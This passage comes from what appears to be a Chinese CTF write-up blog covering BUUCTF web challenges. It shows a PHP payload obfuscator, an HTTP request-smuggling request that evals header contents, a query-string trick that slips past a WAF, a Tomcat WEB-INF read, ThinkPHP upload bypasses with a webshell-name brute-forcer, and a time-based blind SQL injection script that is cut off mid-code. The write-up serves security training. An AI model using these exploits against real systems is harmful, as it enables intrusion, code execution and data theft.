class="string">&quot;(~((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))&amp;(~((~((2).(0))&#123;0&#125;)&amp;(~((10000000000000000000).(1))&#123;3&#125;)))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;U&quot;</span> :<span class="string">&quot;(((10000000000000000000).(1))&#123;3&#125;)|((~((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))&amp;(~((~((1).(0))&#123;0&#125;)&amp;(~((1.1).(0))&#123;2&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_&quot;</span> :<span class="string">&quot;((10000000000000000000).(1))&#123;3&#125;|(((~((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))&amp;(~((~((1).(0))&#123;0&#125;)&amp;(~((1.1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;T&quot;</span> :<span class="string">&quot;(~(((1).(0))&#123;0&#125;&amp;(~((2).(0))&#123;0&#125;)))&amp;(~((~((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(0))&#123;0&#125;&amp;(~((1.1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;I&quot;</span> :<span class="string">&quot;(~(((0).(0))&#123;0&#125;))&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~((1).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;N&quot;</span> :<span class="string">&quot;(~((0).(0))&#123;0&#125;)&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~(((2).(0))&#123;0&#125;))&amp;(~((~((1).(0))&#123;0&#125;)&amp;((10000000000000000000).(1))&#123;3&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;f&quot;</span> :<span class="string">&quot;((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))|((~(((4).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B&quot;</span> :<span class="string">&quot;(~(((4).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;r&quot;</span> :<span class="string">&quot;(~((~(((2).(0))&#123;0&#125;))&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span> :<span class="string">&quot;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))))&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~(((2).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;]&quot;</span> :<span class="string">&quot;(((10000000000000000000).(1))&#123;3&#125;)|((((8).(0))&#123;0&#125;)&amp;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;C&quot;</span>:<span class="string">&quot;(~(((4).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;M&quot;</span>:<span class="string">&quot;(~(((0).(0))&#123;0&#125;))&amp;(~((~(((8).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\\&quot;</span>:<span class="string">&quot;(~(((((1).(0))&#123;0&#125;))&amp;(~(((2).(0))&#123;0&#125;)))&amp;~((~(((10000000000000000000).(1))&#123;3&#125;))&amp;~((((8).(0))&#123;0&#125;)&amp;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/&quot;</span>:<span class="string">&quot;((((1.1).(0))&#123;1&#125;)|(((-1).(0))&#123;0&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;G&quot;</span>:<span class="string">&quot;(~(((8).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g&quot;</span>:<span class="string">&quot;(((10000000000000000000).(1))&#123;3&#125;)|((((2).(0))&#123;0&#125;)&amp;(((1.1).(0))&#123;1&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:<span class="string">&quot;((((1).(0))&#123;0&#125;)&amp;((~((2).(0))&#123;0&#125;)))|((((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))&amp;(~((((1).(0))&#123;0&#125;)&amp;(~(((1.1).(0))&#123;1&#125;)))))&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">s=<span class="string">&quot;scandir&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">topayload</span>(<span class="params">s</span>):</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span>(i <span class="keyword">in</span> arr):</span><br><span class="line">            result+=(<span class="string">&quot;(&quot;</span>+arr[i]+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(i.upper() <span class="keyword">in</span> arr):</span><br><span class="line">            result+=(<span class="string">&quot;(&quot;</span>+arr[i.upper()]+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(i.lower() <span class="keyword">in</span> arr):</span><br><span class="line">            result+=(<span class="string">&quot;(&quot;</span>+arr[i.lower()]+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result[:-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tomethod</span>(<span class="params">meth,para,c=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+topayload(meth)+<span class="string">&quot;)(&quot;</span>+topayload(para)+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+topayload(meth)+<span class="string">&quot;)(&quot;</span>+(para)+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="comment"># print(tomethod(&quot;var_dump&quot;,tomethod(&quot;scandir&quot;,&quot;/&quot;),False))</span></span><br><span class="line"><span class="built_in">print</span>(tomethod(<span class="string">&quot;var_dump&quot;</span>,tomethod(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;/f1agg&quot;</span>),<span class="literal">False</span>))</span><br><span class="line"><span class="comment"># print(tomethod(&quot;file_get_contents&quot;,&quot;/f1agg&quot;))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="解法二-HTTP走私"><a href="#解法二-HTTP走私" class="headerlink" title="解法二 HTTP走私"></a>解法二 HTTP走私</h4><p>http走私请看:<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
<p>这题php禁用了<code> $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;反引号&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</code></p>
<p>apache再禁用了字母和不可打印字符</p>
<p>后来看别人的wp知道了,虽然服务器返回400,但是还会将请求转发给后端,标准的http走私</p>
<p><img src="https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png" alt="image.png"></p>
<p>真几把神奇，刚看到http走私的时候我还以为是前后端对content-type的解析不同</p>
<p>结合getallheads来绕过php字符限制</p>
<p>最后payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:28023</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36</span><br><span class="line">Referer: http://node3.buuoj.cn:28023/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 422</span><br><span class="line">Content-Length: 0</span><br><span class="line">A: var_dump(file_get_contents(&quot;/f1agg&quot;));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="解法三-利用php字符串解析特性绕过apache-waf"><a href="#解法三-利用php字符串解析特性绕过apache-waf" class="headerlink" title="解法三 利用php字符串解析特性绕过apache waf"></a>解法三 利用php字符串解析特性绕过apache waf</h4><p>php字符串解析特性</p>
<p><img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small"></p>
<p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small"></p>
<p>当我们发送这样一个请求是:<code>?%20num=123</code></p>
<p>apache的检查规则只能匹配到num,而这个请求在php却会被解析为$_GET[‘num’]最后成功绕过apache的waf</p>
<h3 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h3><p>扫目录发现一个Download,去登入界面查找一下download,发现<code>Download?filename=help.docx</code></p>
<p>可是无论下什么也不行,看了别人的wp发现post就可以233333</p>
<p>接下来就简单了,因为这是一个tomcat的网站</p>
<p>贴一个tomcat的结构图</p>
<p><img src="https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png"></p>
<p>先去查看一下WEB-INF/web.xml</p>
<p>发现</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是去WEB-INF/classes/com/wm/ctf/FlagController.class</p>
<p>查看,发现一个base64编码的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg" alt="image.png"></p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error(<span class="variable">$upload</span>-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.substr(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法一-thinkphp漏洞"><a href="#解法一-thinkphp漏洞" class="headerlink" title="解法一 thinkphp漏洞"></a>解法一 thinkphp漏洞</h4><p>利用<code>Think\Controller,\Think\Upload()</code> 等关键字查询到该thinkphp版本大致在3.2.x,这里我去找了3.2.3的源码</p>
<p>阅读文件上传部分代码发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$files</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> === <span class="variable">$files</span>) &#123;</span><br><span class="line">            <span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	.....</span><br><span class="line">           </span><br><span class="line">        <span class="variable">$files</span> = <span class="keyword">$this</span>-&gt;dealFiles(<span class="variable">$files</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = strip_tags(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        ....</span><br><span class="line">	&#125;</span><br><span class="line">    ....</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里注意到有个strip_tags,查询文档<code>         从字符串中去除 HTML 和 PHP 标记</code></p>
<p>ok,成功找到绕过后缀名限制的方法</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg" alt="image.png"></p>
<p>成功getflag美滋滋</p>
<h4 id="解法二-上传多个文件绕过后缀名检测"><a href="#解法二-上传多个文件绕过后缀名检测" class="headerlink" title="解法二  上传多个文件绕过后缀名检测"></a>解法二  上传多个文件绕过后缀名检测</h4><p>大佬们太强了/fad/fad</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line"><span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>如果上传多个文件, $uploadFile内包含多个文件,<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>自然也就无效了,接下来就是获取文件名,就可以getshell,因为thinkphp文件名是递增的,所以也就很容易获取到想要的文件了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/&quot;</span><br><span class="line">i=(int(&quot;5da9dd208595a&quot;,16)+1)</span><br><span class="line">while True:</span><br><span class="line">	print(url+hex(i)[2:]+&quot;.php&quot;)</span><br><span class="line">	res=requests.get(url+hex(i)[2:]+&quot;.php&quot;)</span><br><span class="line">	print(res.status_code)</span><br><span class="line">	if(res.status_code==200):</span><br><span class="line">		print(url+hex(i)[2:]+&quot;.php&quot;)</span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">	i+=1</span><br></pre></td></tr></table></figure>



<p>虽然说可以爆出来，不过也要跑好一会</p>
<h3 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h3><p>利用libcurl和paras_url的差异来判断</p>
<p><a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com">http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com</a></p>
<p>200</p>
<p><a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219">http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219</a></p>
<p>504</p>
<p>而访问<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28001/?url=http://39.108.164.219">http://node3.buuoj.cn:28001/?url=http://39.108.164.219</a></p>
<p>也是504,所以有可能使用file_get_contents来访问url</p>
<p>刚开始一直盯着url,后面看到收集信息,99%是sql注入的题</p>
<p>就是不知道要收集什么信息</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.20821499824524 s </span></span><br><span class="line"><span class="comment"> Current Ip: 127.0.0.1  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Debug Info: </span></span><br><span class="line"><span class="comment"> Duration: 0.34751987457275 s </span></span><br><span class="line"><span class="comment"> Current Ip: &#x27;# </span></span><br><span class="line"><span class="comment">Last Ip: &#x27; --&gt;</span></span><br></pre></td></tr></table></figure>



<p>这题虽然是sql注入,但比较操蛋的是,sql注入的是last ip</p>
<p>因为这个加上自己的懒惰让我搞了8-9个小时,因小失大/fad</p>
<p>题目提示会收集信息,能收集的大概也就是ip地址</p>
<p>于是找到x-forward-for http注入,虽然说的轻松,但是我完全找了好久还加上了wp的帮助</p>
<p>emmmm直接扔脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand_str</span>(<span class="params">length=<span class="number">8</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, length))</span><br><span class="line"></span><br><span class="line">ii=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">curl_url</span>(<span class="params">sql</span>):</span></span><br><span class="line">    <span class="keyword">global</span> ii</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;node3.buuoj.cn:28645&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cache-Control&quot;</span>:<span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;close&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;track_uuid&quot;</span>:<span class="string">&quot;1e3b12a4-60f8-4778-a0b7-%s;&quot;</span> % rand_str()&#125;</span><br><span class="line">    <span class="comment">#1&#x27;+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))&gt;0,sleep(10),0)+&#x27;13</span></span><br><span class="line">    <span class="comment"># headers[&quot;X-Forwarded-For&quot;]=&quot;1&#x27;+if(&quot;+sql+&quot;,sleep(10),0)+&#x27;&quot;+str(ii)</span></span><br><span class="line">    url=<span class="string">&quot;http://node3.buuoj.cn:28841?url=http://127.0.0.1&quot;</span></span><br><span class="line">    <span class="comment">#清空</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        headers[<span class="string">&quot;X-Forwarded-For&quot;</span>]=<span class="string">&quot;clear&quot;</span>+<span class="built_in">str</span>(ii)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res= requests.get(url,headers=headers,cookies=cookies,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Last Ip: clear&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ii+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#压入</span></span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>]=<span class="string">&quot;1&#x27;+if(&quot;</span>+sql+<span class="string">&quot;,sleep(10),0)+&#x27;&quot;</span>+<span class="built_in">str</span>(ii)</span><br><span class="line">    res= requests.get(url,headers=headers,cookies=cookies,timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#执行</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ii+=<span class="number">1</span></span><br><span class="line">        headers[<span class="string">&quot;X-Forwarded-For&quot;</span>]=<span class="string">&quot;clear&quot;</span>+<span class="built_in">str</span>(ii)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res= requests.get(url,headers=headers,cookies=cookies,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> 